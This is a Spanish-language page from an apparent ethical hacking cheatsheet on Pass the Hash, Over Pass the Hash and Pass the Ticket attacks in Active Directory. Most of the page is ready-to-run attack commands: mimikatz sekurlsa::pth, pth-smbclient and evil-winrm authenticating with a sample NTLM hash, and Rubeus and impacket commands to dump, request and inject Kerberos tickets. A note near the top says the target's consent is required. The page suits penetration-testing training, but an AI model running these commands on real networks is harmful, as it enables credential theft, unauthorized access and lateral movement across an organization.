
# Pass the Hash

En lugar de utilizar la contraseña real, el atacante utiliza un hash de la contraseña (obtenido mediante técnicas de dumping de memoria o de robo de credenciales) para autenticarse en otros sistemas y aplicaciones.

{% hint style="danger" %}
**Nota:** Este tipo de técnicas son muy invasivas, ya que vamos a conseguir credenciales y información sensible en una organización por lo que no podemos utilizar estas técnicas sin un consentimiento o aprobación por parte del objetivo
{% endhint %}

## <mark style="color:purple;">Pass the Hash con Windows</mark>

* Descargar módulo logonsessions de sysinternals

{% embed url="<https://learn.microsoft.com/en-us/sysinternals/downloads/logonsessions>" %}

{% code title="Windows de empleado" %}

```
cd logonsessions
.\logonsessions.exe
```

{% endcode %}

* Copiar el hash NTLM de un usuario administrador

{% code title="Windows de empleado" %}

```php
./mimikatz.exe
sekurlsa::pth /user:administrador /domain:corp.local /ntlm:a87f3a337d73085c45f9416be5787d86
```

{% endcode %}

## <mark style="color:purple;">Pass the Hash con Kali Linux</mark>

{% code overflow="wrap" %}

```markup
pth-smbclient //<ip_de_equipo>/<nombre_de_compartido> -U <nombre_de_usuario> --pw-nt-hash <hash_de_contraseña> -W <nombre_organizacion>
```

{% endcode %}

Ejemplo:

{% code overflow="wrap" %}

```markup
pth-smbclient //172.16.123.143/c$ -U administrador --pw-nt-hash a87f3a337d73085c45f9416be5787d86 -W corp.local
```

{% endcode %}

## <mark style="color:purple;">Evil WinRM</mark>

{% code title="Windows de empleado" %}

```
winrm quickconfig
```

{% endcode %}

{% code title="Kali Linux" %}

```
evil-winrm -i IP-EQUIPO -u Administrador -p Passw0rd
```

{% endcode %}

#### Si solo tenemos el hash:

```
evil-winrm -i 172.16.123.143 -u Administrador -H a87f3a337d73085c45f9416be5787d86
```

## <mark style="color:purple;">Over Pass The Hash</mark>

Over Pass the Hash (o Pass the Ticket) es una técnica de ataque que se utiliza para obtener acceso no autorizado a sistemas y aplicaciones en entornos de Active Directory, utilizando un ticket de autenticación válido en lugar de la contraseña real del usuario.

### Con Mimikatz

<pre class="language-php" data-title="Windows de empleado"><code class="lang-php">sekurlsa::pth /user:administrador /domain:corp.local /ntlm:a87f3a337d73085c45f9416be5787d86
<strong>
</strong><strong>php# En la nueva terminal: 
</strong>dir \\DC01\c$

cd Rubeus
.\Rubeus.exe asktgt /domain:corp.local /user:administrador /aes256:HASH /ptt 
# (El HASH se saca con Mimikatz sekurlsa::ekeys)
</code></pre>

Ver instalación de Rubeus:

{% content-ref url="/pages/GtnkYfiY8gDIXEjG9MeE" %}
[Hacking en Kerberos](/ethical-hacking-cheatsheet/active-directory/active-directory/kerberos/hacking-en-kerberos.md)
{% endcontent-ref %}

### Con Kali Linux

```
Impacket-getTGT corp.local/administrador -hashes :c654be88842fbf4e1f080a89ec6323fa
```

## <mark style="color:purple;">Pass The Ticket</mark>

{% code title="Windows de empleado" overflow="wrap" %}

```php
klist (para mostrar los tickets en memoria)
.\Rubeus.exe dump 

# Copiar el ticket de administrador a un editor de texto y quitar los espacios y los saltos de línea

# Con Mimikatz: 
sekurlsa::tickets (nos vuelca la Session Key)
.\Rubeus.exe ptt /ticket:TICKET_SIN_ESPACIOS
```

{% endcode %}

***

## Más sobre esta técnica

También dedico una sección entera hablando de movimientos laterales con Pass the Hash en la siguiente sección:

{% content-ref url="/pages/vVLk9MKTA90MqQT5jlRK" %}
[Pass the Hash (PtH)](/ethical-hacking-cheatsheet/post-explotacion/post-explotacion/movimientos-laterales/pass-the-hash-pth.md)
{% endcontent-ref %}
